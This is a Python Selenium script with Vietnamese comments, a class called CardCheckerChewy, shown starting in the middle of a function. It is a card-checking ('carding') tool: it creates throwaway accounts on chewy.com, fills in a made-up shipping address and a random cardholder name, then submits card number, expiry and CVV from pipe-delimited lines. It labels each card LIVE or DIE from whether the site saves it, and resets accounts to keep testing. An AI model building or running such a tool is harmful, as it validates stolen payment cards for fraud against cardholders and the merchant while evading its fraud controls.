selectors = [
    "button[type='submit']",  # Submit button
    "//button[contains(text(), 'Create Account')]",  # XPath with text
    "//input[@value='Create Account']",  # Input XPath
    "button",  # Any button (will check text)
]

for selector in selectors:
    try:
        if selector.startswith("//"):
            elements = self.driver.find_elements("xpath", selector)
        else:
            elements = self.driver.find_elements("css selector", selector)
        
        for elem in elements:
            if elem.is_displayed() and elem.is_enabled():
                text = elem.text.lower() if elem.text else ""
                value = elem.get_attribute('value') or ""
                if "create" in text or "create" in value.lower():
                    create_btn = elem
                    print(f"[✓] Found Create Account button with text: '{elem.text}'")
                    break
        
        if create_btn:
            break
            
    except Exception as e:
        continue

if create_btn is None:
    create_btn = self.wait_for_element("button[type='submit']", clickable=True, timeout=10)
            if not create_btn:
                print("[!] Không tìm thấy button Create Account")
                return False
            
            time.sleep(1)
            
            # Click với nhiều cách khác nhau
            try:
                print("[*] Trying to click Create Account button...")
                self.safe_click(create_btn, "Create Account")
                print("[✓] Clicked Create Account button")
            except Exception as e:
                print(f"[!] Lỗi click button: {e}")
                # Thử click bằng JavaScript
                try:
                    print("[*] Trying JavaScript click...")
                    self.driver.execute_script("arguments[0].click();", create_btn)
                    print("[✓] JavaScript click successful")
                except Exception as e2:
                    print(f"[!] JavaScript click failed: {e2}")
                    return False
            
            print("[*] Đợi response sau khi click...")
            time.sleep(3)
            
            # Check có error message không
            try:
                error_elem = self.driver.find_element("xpath", "//*[contains(@class, 'error') or contains(@class, 'Error')]")
                if error_elem and error_elem.is_displayed():
                    error_text = error_elem.text
                    print(f"[!] Error detected: {error_text}")
                    # Nếu có error, vẫn tiếp tục (có thể là warning nhỏ)
            except:
                pass
            
            # Verify account đã được tạo - check URL hoặc element trên homepage
            print("[*] Verify account đã được tạo...")
            current_url = self.driver.current_url
            print(f"[DEBUG] Current URL: {current_url}")
            
            max_wait = 10  # Giảm xuống 10s thôi
            for i in range(max_wait):
                current_url = self.driver.current_url
                
                # Check nếu đã về homepage hoặc có sign in indicator
                if "chewy.com" in current_url and "login" not in current_url.lower() and "sign" not in current_url.lower():
                    print(f"[✓] Account đã được tạo! URL: {current_url}")
                    time.sleep(2)
                    return True
                
                # Check page title
                try:
                    page_title = self.driver.title
                    if "Chewy" in page_title and "Sign" not in page_title:
                        print(f"[✓] Đã về homepage! Title: {page_title}")
                        time.sleep(2)
                        return True
                except:
                    pass
                
                print(f"[*] Đợi account... ({i+1}/{max_wait}s) - URL: {current_url[:50]}...")
                time.sleep(1)
            
            # Nếu sau 10s vẫn chưa thấy → force tiếp tục
            print("[!] Timeout verify account")
            print(f"[DEBUG] Final URL: {self.driver.current_url}")
            print("[*] Force tiếp tục...")
            
            # Navigate về homepage để chắc chắn
            try:
                print("[*] Navigate về homepage...")
                self.driver.get(self.base_url)
                time.sleep(3)
                print("[✓] Đã về homepage")
            except Exception as e:
                print(f"[!] Lỗi navigate: {e}")
            
            return True
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            return False
    
    def click_product(self) -> bool:
        """B9: Click vào sản phẩm - simplified"""
        print("[*] B9: Click vào sản phẩm...")
        
        # Debug: Check current page
        try:
            current_url = self.driver.current_url
            page_title = self.driver.title
            print(f"[DEBUG] Current URL: {current_url}")
            print(f"[DEBUG] Page title: {page_title}")
        except:
            pass
        
        # Try multiple simple selectors for any clickable product
        selectors = [
            "a[href*='/dp/']",  # Product links
            ".product-tile a",   # Product tile links
            "[data-testid*='product'] a",  # Product test IDs
            "li a[href*='product']",  # Any product link in list
            "a img[alt*='product']",  # Product images
        ]
        
        for i, selector in enumerate(selectors):
            try:
                print(f"[*] Trying selector {i+1}: {selector}")
                
                # Find multiple elements and try first few
                products = self.driver.find_elements("css selector", selector)
                print(f"[DEBUG] Found {len(products)} elements")
                
                if products:
                    # Try first 3 products
                    for j, product in enumerate(products[:3]):
                        try:
                            if product.is_displayed() and product.is_enabled():
                                print(f"[*] Trying product {j+1}...")
                                
                                # Use JavaScript click directly
                                self.driver.execute_script("arguments[0].click();", product)
                                print(f"[✓] Clicked product {j+1}")
                                
                                # Wait and check if navigation happened
                                time.sleep(3)
                                new_url = self.driver.current_url
                                if new_url != current_url:
                                    print("[✓] Page navigated successfully")
                                    return True
                                else:
                                    print("[!] No navigation, trying next...")
                                    
                        except Exception as e:
                            print(f"[!] Error clicking product {j+1}: {e}")
                            continue
                            
            except Exception as e:
                print(f"[!] Error with selector {selector}: {e}")
                continue
        
        print("[!] Could not find any clickable products")
        return False
        
        print("[!] Không thể click vào sản phẩm sau 3 lần thử")
        return False
    
    def add_product_to_cart(self) -> bool:
        """B10: Add sản phẩm - với retry"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"[*] B10: Add sản phẩm (attempt {attempt + 1}/{max_retries})...")
                
                # Scroll để tìm sản phẩm
                print("[*] Scroll để tìm sản phẩm...")
                self.driver.execute_script("window.scrollTo(0, 800);")
                time.sleep(2)
                
                # Tìm button Add to Cart
                buttons = self.driver.find_elements("xpath", "//button[contains(., 'Add to Cart')]")
                if buttons:
                    print(f"[*] Tìm thấy {len(buttons)} button Add to Cart")
                    self.safe_click(buttons[0], "Add to Cart")
                    time.sleep(3)
                    print("[✓] Đã add sản phẩm vào cart")
                    return True
                else:
                    print(f"[!] Không tìm thấy button Add to Cart (attempt {attempt + 1})")
                    if attempt < max_retries - 1:
                        print("[*] Thử scroll thêm...")
                        self.driver.execute_script("window.scrollTo(0, 1200);")
                        time.sleep(2)
                        
            except Exception as e:
                print(f"[!] Lỗi attempt {attempt + 1}: {e}")
                if attempt < max_retries - 1:
                    print("[*] Retry...")
                    time.sleep(2)
        
        print("[!] Không thể add sản phẩm sau 3 lần thử")
        return False
    
    def go_to_cart(self) -> bool:
        """B11: Vào giỏ hàng - với retry"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"[*] B11: Vào giỏ hàng (attempt {attempt + 1}/{max_retries})...")
                
                # Tìm icon giỏ hàng
                cart_icon = self.wait_for_element("#header > header > div.sticky-header.sticky > div > div.header__cart > span > span > span > a", clickable=True, timeout=10)
                if not cart_icon:
                    print(f"[!] Không tìm thấy icon giỏ hàng (attempt {attempt + 1})")
                    if attempt < max_retries - 1:
                        print("[*] Scroll lên top và retry...")
                        self.driver.execute_script("window.scrollTo(0, 0);")
                        time.sleep(2)
                        continue
                    return False
                
                time.sleep(1)
                self.safe_click(cart_icon, "Cart")
                print("[*] Đợi trang giỏ hàng load...")
                time.sleep(5)
                print("[✓] Đã vào giỏ hàng")
                return True
                
            except Exception as e:
                print(f"[!] Lỗi attempt {attempt + 1}: {e}")
                if attempt < max_retries - 1:
                    print("[*] Retry...")
                    time.sleep(2)
        
        print("[!] Không thể vào giỏ hàng sau 3 lần thử")
        return False
    
    def process_checkout(self) -> bool:
        """B12: Checkout - với retry"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"[*] B12: Checkout (attempt {attempt + 1}/{max_retries})...")
                time.sleep(2)
                
                # Tìm button Checkout
                buttons = self.driver.find_elements("xpath", "//button[contains(., 'Checkout')] | //a[contains(., 'Checkout')]")
                if buttons:
                    print(f"[*] Tìm thấy {len(buttons)} button Checkout")
                    time.sleep(1)
                    self.safe_click(buttons[0], "Checkout")
                    print("[*] Đợi trang checkout load...")
                    time.sleep(8)
                    print("[✓] Đã checkout")
                    return True
                else:
                    print(f"[!] Không tìm thấy button Checkout (attempt {attempt + 1})")
                    if attempt < max_retries - 1:
                        print("[*] Scroll và retry...")
                        self.driver.execute_script("window.scrollTo(0, 500);")
                        time.sleep(2)
                        
            except Exception as e:
                print(f"[!] Lỗi attempt {attempt + 1}: {e}")
                if attempt < max_retries - 1:
                    print("[*] Retry...")
                    time.sleep(2)
        
        print("[!] Không thể checkout sau 3 lần thử")
        return False
    
    def fill_shipping_address(self) -> bool:
        """B12-B13: Điền shipping address - DÙNG CLASS PATTERN"""
        try:
            print("[*] Điền shipping address bằng JavaScript...")
            time.sleep(3)
            
            # Generate random name for shipping
            random_name = self.get_random_name()
            print(f"[*] Using random name for shipping: {random_name}")
            
            # Dùng JavaScript để điền theo class pattern và index
            js_script = """
            // Helper function - Trigger React events properly
            function setInputValue(element, value) {
                if (element) {
                    // Set value using React's way
                    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                    nativeInputValueSetter.call(element, value);
                    
                    // Trigger React events
                    const inputEvent = new Event('input', { bubbles: true });
                    const changeEvent = new Event('change', { bubbles: true });
                    const blurEvent = new Event('blur', { bubbles: true });
                    
                    element.dispatchEvent(inputEvent);
                    element.dispatchEvent(changeEvent);
                    element.dispatchEvent(blurEvent);
                    
                    return true;
                }
                return false;
            }
            
            // Lấy tất cả input có class kib-input-text__control
            const textInputs = document.querySelectorAll('.kib-input-text__control');
            console.log('Found text inputs:', textInputs.length);
            
            if (textInputs.length < 5) {
                return 'ERROR: Not enough text inputs found: ' + textInputs.length;
            }
            
            // 1. Name (input đầu tiên)
            if (!setInputValue(textInputs[0], arguments[0])) {
                return 'ERROR: Cannot set Name';
            }
            console.log('Set Name:', textInputs[0].value);
            
            // 2. Street Address (autocomplete input)
            const streetInput = document.querySelector('.kib-input-autocomplete__control');
            if (!streetInput) {
                return 'ERROR: Street input not found';
            }
            
            // Focus vào input trước
            streetInput.focus();
            
            if (!setInputValue(streetInput, '123 W 18th St')) {
                return 'ERROR: Cannot set Street';
            }
            console.log('Set Street:', streetInput.value);
            
            // Verify street value
            if (!streetInput.value || streetInput.value === '') {
                return 'ERROR: Street value is empty after setting';
            }
            
            // 3. Apt (input thứ 2 - optional)
            if (textInputs.length > 1) {
                setInputValue(textInputs[1], 'Apt 5B');
                console.log('Set Apt:', textInputs[1].value);
            }
            
            // 4. City (input thứ 3)
            if (!setInputValue(textInputs[2], 'New York')) {
                return 'ERROR: Cannot set City';
            }
            console.log('Set City:', textInputs[2].value);
            
            // 5. State (select dropdown)
            const stateSelect = document.querySelector('.kib-input-select__control');
            if (!stateSelect) {
                return 'ERROR: State select not found';
            }
            // Set select value using React's way
            const nativeSelectValueSetter = Object.getOwnPropertyDescriptor(window.HTMLSelectElement.prototype, 'value').set;
            nativeSelectValueSetter.call(stateSelect, 'NY');
            stateSelect.dispatchEvent(new Event('change', { bubbles: true }));
            stateSelect.dispatchEvent(new Event('blur', { bubbles: true }));
            console.log('Set State: NY');
            
            // 6. ZIP Code (input thứ 4)
            if (!setInputValue(textInputs[3], '10001')) {
                return 'ERROR: Cannot set ZIP';
            }
            console.log('Set ZIP:', textInputs[3].value);
            
            // 7. Phone Number - tìm theo name="phone"
            const phoneInput = document.querySelector('input[name="phone"]');
            if (!phoneInput) {
                console.log('ERROR: Phone input not found');
                return 'ERROR: Phone input not found';
            }
            
            console.log('Found phone input:', phoneInput.getAttribute('id'));
            
            // Focus vào phone input
            phoneInput.focus();
            
            // Set value
            if (!setInputValue(phoneInput, '2175551234')) {
                return 'ERROR: Cannot set Phone';
            }
            console.log('Set Phone:', phoneInput.value);
            
            // Verify phone value
            if (!phoneInput.value || phoneInput.value === '') {
                console.log('ERROR: Phone value is empty after setting');
                return 'ERROR: Phone value is empty after setting';
            }
            
            return 'SUCCESS';
            """
            
            print("[*] Executing JavaScript to fill form...")
            result = self.driver.execute_script(js_script, random_name)  # Pass random name as argument
            print(f"[*] JavaScript result: {result}")
            
            if result != 'SUCCESS':
                print(f"[!] JavaScript error: {result}")
                return False
            
            print("[✓] Đã điền xong tất cả fields bằng JavaScript!")
            
            # Đóng autocomplete dropdown bằng ESC
            print("[*] Đóng autocomplete dropdown...")
            try:
                from selenium.webdriver.common.keys import Keys
                street_input = self.driver.find_element("css selector", ".kib-input-autocomplete__control")
                if street_input:
                    street_input.send_keys(Keys.ESCAPE)
                    time.sleep(0.5)
                    print("[✓] Đã đóng autocomplete")
            except:
                print("[*] Không cần đóng autocomplete")
            
            time.sleep(1)
            
            # 8. Click Ship to this Address button
            print("[*] Click Ship to this Address...")
            
            # Thử nhiều cách tìm button
            ship_btn = None
            
            # Cách 1: Tìm button có text "Ship to this Address"
            try:
                buttons = self.driver.find_elements("xpath", "//button[contains(., 'Ship to this Address')]")
                if buttons:
                    ship_btn = buttons[0]
                    print("[✓] Tìm thấy button bằng text")
            except:
                pass
            
            # Cách 2: Tìm button màu cam (class hoặc style)
            if not ship_btn:
                try:
                    buttons = self.driver.find_elements("xpath", "//button[@type='submit' or @type='button']")
                    for btn in buttons:
                        if btn.is_displayed() and btn.is_enabled():
                            # Check nếu button có màu cam hoặc text liên quan
                            btn_text = btn.text.lower()
                            if 'ship' in btn_text or 'address' in btn_text:
                                ship_btn = btn
                                print(f"[✓] Tìm thấy button: {btn.text}")
                                break
                except:
                    pass
            
            if not ship_btn:
                print("[!] Không tìm thấy button Ship to this Address")
                return False
            
            time.sleep(1)
            self.safe_click(ship_btn, "Ship to this Address")
            print("[*] Đợi sau khi click Ship to this Address...")
            time.sleep(3)
            
            # Xử lý popup "Please confirm your address to continue"  
            print("[*] Kiểm tra popup confirm address...")
            time.sleep(3)
            
            # Đợi modal xuất hiện
            print("[*] Đợi modal xuất hiện...")
            modal = self.wait_for_element("div[id^='kib-modal'][role='dialog']", timeout=5)
            
            if not modal:
                print("[*] Không có popup")
                print("[✓✓✓] Đã điền xong shipping address!")
                return True
            
            print("[✓] Modal đã xuất hiện!")
            time.sleep(2)
            
            # DEBUG: Print ra TẤT CẢ thông tin về button
            print("\n[DEBUG] Thông tin chi tiết về button:")
            try:
                js_debug_button = """
                const modal = document.querySelector('div[id^="kib-modal"][role="dialog"]');
                if (!modal) return {error: 'Modal not found'};
                
                const result = {
                    modal_id: modal.id,
                    modal_class: modal.className,
                    buttons: []
                };
                
                // Tìm tất cả buttons trong modal
                const buttons = modal.querySelectorAll('button');
                buttons.forEach((btn, idx) => {
                    result.buttons.push({
                        index: idx,
                        text: btn.textContent.trim(),
                        id: btn.id,
                        class: btn.className,
                        disabled: btn.disabled,
                        offsetParent: btn.offsetParent !== null,
                        selector: `button:nth-child(${idx + 1})`
                    });
                });
                
                // Tìm button trong modal__actions
                const modalActions = modal.querySelector('div.kib-modal__actions');
                if (modalActions) {
                    result.modal_actions_found = true;
                    const btn = modalActions.querySelector('button');
                    if (btn) {
                        result.confirm_button = {
                            text: btn.textContent.trim(),
                            id: btn.id,
                            class: btn.className,
                            disabled: btn.disabled,
                            offsetParent: btn.offsetParent !== null,
                            outerHTML: btn.outerHTML.substring(0, 200)
                        };
                    }
                }
                
                return result;
                """
                
                debug_result = self.driver.execute_script(js_debug_button)
                print(f"Modal ID: {debug_result.get('modal_id')}")
                print(f"Modal Class: {debug_result.get('modal_class')}")
                print(f"Modal Actions Found: {debug_result.get('modal_actions_found')}")
                print(f"\nButtons in modal: {len(debug_result.get('buttons', []))}")
                for btn_info in debug_result.get('buttons', []):
                    print(f"  [{btn_info['index']}] Text: '{btn_info['text']}'")
                    print(f"      ID: {btn_info['id']}")
                    print(f"      Class: {btn_info['class']}")
                    print(f"      Disabled: {btn_info['disabled']}")
                    print(f"      Visible: {btn_info['offsetParent']}")
                
                if debug_result.get('confirm_button'):
                    cb = debug_result['confirm_button']
                    print(f"\n[CONFIRM BUTTON]:")
                    print(f"  Text: '{cb['text']}'")
                    print(f"  ID: {cb['id']}")
                    print(f"  Class: {cb['class']}")
                    print(f"  Disabled: {cb['disabled']}")
                    print(f"  Visible: {cb['offsetParent']}")
                    print(f"  HTML: {cb['outerHTML']}")
                print()
            except Exception as e:
                print(f"[!] Debug error: {e}")
            
            # CLICK BUTTON - thử tất cả cách có thể
            print("[*] Bắt đầu click button Confirm Address...")
            
            # Cách 1: Tìm button trong modal__actions
            try:
                print("[*] Cách 1: div.kib-modal__actions > button")
                btn = modal.find_element("css selector", "div.kib-modal__actions button")
                print(f"[✓] Tìm thấy button, text: '{btn.text}'")
                self.safe_click(btn, "Confirm Address")
                time.sleep(4)
                print("[✓✓✓] ĐÃ CLICK THÀNH CÔNG!")
                return True
            except Exception as e:
                print(f"[!] Cách 1 thất bại: {e}")
            
            # Cách 2: Tìm span rồi click parent
            try:
                print("[*] Cách 2: span.kib-button-new__label")
                span = modal.find_element("xpath", ".//span[contains(@class, 'kib-button-new__label') and contains(text(), 'Confirm')]")
                btn = span.find_element("xpath", "./..")
                print(f"[✓] Tìm thấy button qua span")
                self.safe_click(btn, "Confirm Address")
                time.sleep(4)
                print("[✓✓✓] ĐÃ CLICK THÀNH CÔNG!")
                return True
            except Exception as e:
                print(f"[!] Cách 2 thất bại: {e}")
            
            # Cách 3: JavaScript click trực tiếp
            try:
                print("[*] Cách 3: JavaScript click")
                js_click = """
                const modal = document.querySelector('div[id^="kib-modal"][role="dialog"]');
                if (modal) {
                    const btn = modal.querySelector('div.kib-modal__actions button');
                    if (btn) {
                        btn.click();
                        return 'CLICKED';
                    }
                }
                return 'NOT_FOUND';
                """
                result = self.driver.execute_script(js_click)
                print(f"[*] JS result: {result}")
                if result == 'CLICKED':
                    time.sleep(4)
                    print("[✓✓✓] ĐÃ CLICK THÀNH CÔNG!")
                    return True
            except Exception as e:
                print(f"[!] Cách 3 thất bại: {e}")
            
            print("[!] TẤT CẢ CÁCH ĐỀU THẤT BẠI!")
            return False
            
            print("[✓✓✓] Đã điền xong shipping address và xử lý popup!")
            return True
            
        except Exception as e:
            print(f"[!] LỖI: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def clear_payment_form(self) -> bool:
        """Clear CHỈ các field thẻ: Card Number, Exp Month, Exp Year, CVV - DÙNG .clear() như khi nhập"""
        try:
            from selenium.webdriver.common.keys import Keys
            print("[*] Clearing card fields only (không động vào giỏ hàng)...")
            
            # 1. Clear Name on Card - PHẢI XÓA để tránh bị ghép tên
            try:
                name_input = self.driver.find_element("xpath", "//input[@type='text' and not(@placeholder='Street Address') and not(@placeholder='City') and not(@placeholder='ZIP Code')]")
                name_input.click()
                time.sleep(0.2)
                name_input.clear()
                # Select all và delete để chắc chắn
                name_input.send_keys(Keys.COMMAND + "a")  # Mac dùng COMMAND
                name_input.send_keys(Keys.DELETE)
                print("[✓] Cleared Name on Card")
            except Exception as e:
                print(f"[!] Không clear được Name on Card: {e}")
            
            # 2. Clear Card Number - DÙNG .clear() như khi nhập
            try:
                card_input = self.driver.find_element("xpath", "//input[@type='tel' or @inputmode='numeric']")
                card_input.click()
                time.sleep(0.2)
                card_input.clear()
                # Select all và delete để chắc chắn
                card_input.send_keys(Keys.COMMAND + "a")  # Mac dùng COMMAND
                card_input.send_keys(Keys.DELETE)
                print("[✓] Cleared Card Number")
            except Exception as e:
                print(f"[!] Không clear được Card Number: {e}")
            
            # 3. Clear CVV - DÙNG .clear() như khi nhập
            try:
                cvv_input = self.driver.find_element("css selector", "#credit-card-cvv-textbox")
                cvv_input.click()
                time.sleep(0.2)
                cvv_input.clear()
                # Select all và delete để chắc chắn
                cvv_input.send_keys(Keys.COMMAND + "a")  # Mac dùng COMMAND
                cvv_input.send_keys(Keys.DELETE)
                print("[✓] Cleared CVV")
            except Exception as e:
                print(f"[!] Không clear được CVV: {e}")
            
            # 4. Reset Exp Month dropdown về giá trị đầu tiên
            try:
                from selenium.webdriver.support.ui import Select
                month_select = Select(self.driver.find_element("xpath", "//select[contains(@id, 'expMonth') or contains(@name, 'month')]"))
                month_select.select_by_index(0)
                print("[✓] Reset Exp Month")
            except Exception as e:
                print(f"[!] Không reset được Exp Month: {e}")
            
            # 5. Reset Exp Year dropdown về giá trị đầu tiên
            try:
                year_select = Select(self.driver.find_element("xpath", "//select[contains(@id, 'expYear') or contains(@name, 'year')]"))
                year_select.select_by_index(0)
                print("[✓] Reset Exp Year")
            except Exception as e:
                print(f"[!] Không reset được Exp Year: {e}")
            
            # KHÔNG XÓA: Billing Address, và KHÔNG ĐỘNG VÀO GIỎ HÀNG
            
            print("[✓] Đã clear card fields!")
            time.sleep(1)
            return True
            
        except Exception as e:
            print(f"[!] Lỗi clear form: {e}")
            return False
    
    def fill_payment_info(self, card: Dict) -> Tuple[str, str]:
        """B15-B21: Điền payment info + billing address"""
        try:
            from selenium.webdriver.common.keys import Keys
            import random
            
            print("[*] Điền payment form...")
            time.sleep(3)
            
            # Tìm button "Change Card" bằng MỌI CÁCH
            print("[*] Tìm Change Card button...")
            js_find_click = """
            // Cách 1: Text chứa "change" và "card"
            let buttons = Array.from(document.querySelectorAll('button'));
            for (let btn of buttons) {
                let text = btn.textContent.trim().toLowerCase();
                if (text.includes('change') && text.includes('card')) {
                    btn.click();
                    return 'FOUND_1';
                }
            }
            
            // Cách 2: Span chứa "change card"
            let spans = Array.from(document.querySelectorAll('span'));
            for (let span of spans) {
                let text = span.textContent.trim().toLowerCase();
                if (text.includes('change') && text.includes('card')) {
                    let btn = span.closest('button');
                    if (btn) { btn.click(); return 'FOUND_2'; }
                }
            }
            
            // Cách 3: Button trong label có VISA
            let labels = Array.from(document.querySelectorAll('label'));
            for (let label of labels) {
                if (label.textContent.includes('VISA')) {
                    let btn = label.querySelector('button');
                    if (btn) { btn.click(); return 'FOUND_3'; }
                }
            }
            
            return 'NOT_FOUND';
            """
            
            result = self.driver.execute_script(js_find_click)
            print(f"[*] Result: {result}")
            
            if result.startswith('FOUND_'):
                # Đã có thẻ và đã click Change Card
                print("[✓] Đã click Change Card!")
                time.sleep(2)
                
                # Click "Add a New Card"
                print("[*] Click 'Add a New Card'...")
                try:
                    add_new_card_btn = self.driver.find_element("css selector", "div.cpx-add-card-button-container button")
                    self.safe_click(add_new_card_btn, "Add a New Card")
                    time.sleep(2)
                    print("[✓] Đã click Add a New Card!")
                except Exception as e:
                    print(f"[!] Lỗi click Add a New Card: {e}")
            else:
                # Chưa có thẻ - Click radio "Credit or Debit Card"
                print("[*] Chưa có thẻ được lưu, click radio 'Credit or Debit Card'...")
                try:
                    credit_card_radio = self.driver.find_element("xpath", "//input[starts-with(@id, 'kib-radio-') and @type='radio']")
                    self.safe_click(credit_card_radio, "Credit or Debit Card radio")
                    time.sleep(2)
                    print("[✓] Đã click Credit or Debit Card!")
                except Exception as e:
                    print(f"[!] Lỗi click radio: {e}")
            
            time.sleep(2)
            
            # B15: Name on Card - dùng tên phổ biến ở Mỹ
            print("[*] B15: Name on Card...")
            common_names = [
                "James Smith", "Michael Johnson", "Robert Williams", "David Brown",
                "William Jones", "Richard Garcia", "Joseph Martinez", "Thomas Anderson",
                "Christopher Taylor", "Daniel Moore", "Matthew Jackson", "Donald White",
                "Mark Harris", "Paul Martin", "Steven Thompson", "Andrew Clark",
                "Joshua Rodriguez", "Kenneth Lewis", "Kevin Lee", "Brian Walker"
            ]
            card_name = random.choice(common_names)
            name_input = self.driver.find_element("xpath", "//input[@type='text' and not(@placeholder='Street Address') and not(@placeholder='City') and not(@placeholder='ZIP Code')]")
            name_input.click()
            time.sleep(0.2)
            name_input.clear()
            name_input.send_keys(card_name)
            print(f"[✓] Name: {card_name}")
            
            # B16: Card Number
            print("[*] B16: Card Number...")
            card_input = self.driver.find_element("xpath", "//input[@type='tel' or @inputmode='numeric']")
            card_input.click()
            time.sleep(0.2)
            card_input.clear()
            card_input.send_keys(card['number'])
            print(f"[✓] Card: {card['number']}")
            time.sleep(0.5)
            
            # B17: Exp Month (dropdown)
            print("[*] B17: Exp Month...")
            month_select = Select(self.driver.find_element("xpath", "//select[contains(@id, 'expMonth') or contains(@name, 'month')]"))
            month_select.select_by_value(card['exp_month'])
            print(f"[✓] Month: {card['exp_month']}")
            
            # B18: Exp Year (dropdown)
            print("[*] B18: Exp Year...")
            year_select = Select(self.driver.find_element("xpath", "//select[contains(@id, 'expYear') or contains(@name, 'year')]"))
            year_select.select_by_value(card['exp_year'])
            print(f"[✓] Year: {card['exp_year']}")
            
            # B19: CVV
            print("[*] B19: CVV...")
            try:
                cvv_input = self.driver.find_element("css selector", "#credit-card-cvv-textbox")
                cvv_input.click()
                time.sleep(0.3)
                cvv_input.clear()
                cvv_input.send_keys(card['cvv'])
                print(f"[✓] CVV: {card['cvv']}")
            except Exception as e:
                print(f"[!] Lỗi điền CVV: {e}")
            
            time.sleep(1)
            
            # B20: Billing Address - Skip vì đã check "same as shipping address"
            print("[*] B20: Billing Address - Using same as shipping")
            
            # B21: Submit - Click "Use Card"
            print("[*] B21: Click Use Card...")
            time.sleep(2)
            
            try:
                # Tìm button "Use Card" trong cpx-add-card-form-button-container
                use_card_btn = self.driver.find_element("css selector", "div.cpx-add-card-form-button-container button.kib-button-new--transactional")
                print("[✓] Tìm thấy button Use Card")
                self.safe_click(use_card_btn, "Use Card")
                print("[✓] Đã click Use Card!")
            except Exception as e:
                print(f"[!] Lỗi click Use Card: {e}")
                # Thử tìm button khác
                try:
                    use_card_btn = self.driver.find_element("xpath", "//button[contains(text(), 'Use Card')]")
                    self.safe_click(use_card_btn, "Use Card")
                    print("[✓] Đã click Use Card (cách 2)!")
                except:
                    print("[!] Không tìm thấy button Use Card!")
            
            # Đợi response
            print("[*] Đợi response...")
            time.sleep(5)
            
            # Check kết quả: Nếu thẻ LIVE → form đóng, thẻ được lưu
            # Nếu thẻ DIE → vẫn ở form nhập thẻ
            print("[*] Kiểm tra kết quả...")
            
            # Cách 1: Check xem còn form nhập thẻ không
            try:
                card_input = self.driver.find_element("css selector", "input[placeholder='Card Number'], input[id*='card-number']")
                if card_input.is_displayed():
                    print("[!] Vẫn ở form nhập thẻ → Thẻ DIE")
                    
                    # Check error message
                    error_msg = "Thẻ bị từ chối - Không add được vào account"
                    try:
                        error_elem = self.driver.find_element("xpath", "//*[contains(@class, 'error') or contains(text(), 'invalid') or contains(text(), 'declined')]")
                        error_msg = f"Thẻ bị từ chối: {error_elem.text}"
                    except:
                        pass
                    
                    # CLEAR FORM trước khi return
                    print("[*] Thẻ DIE → Clear form để check thẻ tiếp theo...")
                    self.clear_payment_form()
                    
                    return ("DECLINED", error_msg)
            except:
                pass
            
            # Cách 2: Check xem có thẻ được lưu không (VISA ****)
            try:
                saved_card = self.driver.find_element("xpath", "//div[contains(text(), 'VISA') or contains(text(), 'Expires')]")
                if saved_card:
                    print("[✓] Thẻ đã được lưu → Thẻ LIVE!")
                    print("[*] Thẻ LIVE → Sẽ đóng browser và mở mới...")
                    return ("APPROVED", "Thẻ hợp lệ - Đã add vào account thành công")
            except:
                pass
            
            # Cách 3: Check URL
            current_url = self.driver.current_url
            if "thank" in current_url.lower() or "success" in current_url.lower():
                print("[✓] Giao dịch thành công → Thẻ LIVE!")
                print("[*] Thẻ LIVE → Sẽ đóng browser và mở mới...")
                return ("APPROVED", "Thẻ hợp lệ - Giao dịch thành công")
            
            # Nếu không xác định được → Clear form để an toàn
            print("[!] Không xác định được kết quả → Clear form...")
            self.clear_payment_form()
            return ("UNKNOWN", "Không xác định được kết quả")
            
        except Exception as e:
            print(f"[!] LỖI: {e}")
            import traceback
            traceback.print_exc()
            return ("ERROR", str(e))
    
    def reset_account(self):
        """Reset account - đóng browser cũ và tạo mới"""
        try:
            print("[*] Resetting account...")
            self.close()
            time.sleep(2)
            self.email = None
            self.initialized = False
            self.live_count = 0
            self._init_browser()
            print("[✓] Account mới đã sẵn sàng!")
            return True
        except Exception as e:
            print(f"[!] Lỗi reset account: {e}")
            return False
    
    def close(self):
        """Đóng browser"""
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass


if __name__ == "__main__":
    """Test với một vài thẻ"""
    checker = CardCheckerChewy()
    
    # Test cards (format: number|month|year|cvv)
    test_cards = [
        "4532015112830366|12|2025|123",  # Test card 1
        "5425233430109903|11|2026|456",  # Test card 2
    ]
    
    print("\n" + "="*70)
    print("BẮT ĐẦU CHECK CARDS")
    print("="*70 + "\n")
    
    results = []
    for i, card_line in enumerate(test_cards, 1):
        print(f"\n{'='*70}")
        print(f"CARD {i}/{len(test_cards)}: {card_line}")
        print(f"{'='*70}\n")
        
        card_info, status, message = checker.check_card(card_line)
        results.append((card_info, status, message))
        
        print(f"\n[RESULT] {status}: {message}\n")
        
        # Đợi một chút giữa các thẻ
        if i < len(test_cards):
            time.sleep(2)
    
    # Summary
    print("\n" + "="*70)
    print("KẾT QUẢ TỔNG HỢP")
    print("="*70)
    for card_info, status, message in results:
        print(f"[{status}] {card_info}: {message}")
    print("="*70 + "\n")
    
    # Đóng browser
    checker.close()
    print("[✓] Hoàn thành!")
